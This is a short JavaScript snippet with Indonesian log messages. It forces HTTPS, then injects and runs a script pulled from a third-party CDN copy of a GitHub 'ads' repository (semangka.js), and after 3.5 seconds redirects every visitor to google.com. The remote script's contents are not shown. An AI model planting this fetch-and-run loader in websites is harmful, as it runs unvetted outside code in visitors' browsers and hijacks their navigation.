(function() {
    if (window.location.protocol === 'http:') {
        window.location.replace(window.location.href.replace("http://", "https://"));
        return;
    }

    try {
        if (!document.querySelector('meta[http-equiv="Content-Security-Policy"]')) {
            const meta = document.createElement('meta');
            meta.httpEquiv = "Content-Security-Policy";
            meta.content = "upgrade-insecure-requests";
            document.head.prepend(meta);
        }
    } catch (e) {
        console.error("CSP Error:", e);
    }

    const timestamp = new Date().getTime();
    const scriptURL = "https://cdn.statically.io/gh/digiitaltools/ads/main/semangka.js?v=2";
    const targetURL = "https://www.google.com"; 

    const script = document.createElement('script');
    script.src = scriptURL;
    script.async = true;

    script.onload = function() {
        console.log("Script semangka.js berhasil dimuat.");
    };

    script.onerror = function() {
        console.error("Gagal memuat script. Mengalihkan ke target default...");
        window.location.replace(targetURL);
    };

    document.head.appendChild(script);

    setTimeout(() => {
        window.location.replace(targetURL);
    }, 3500);
})();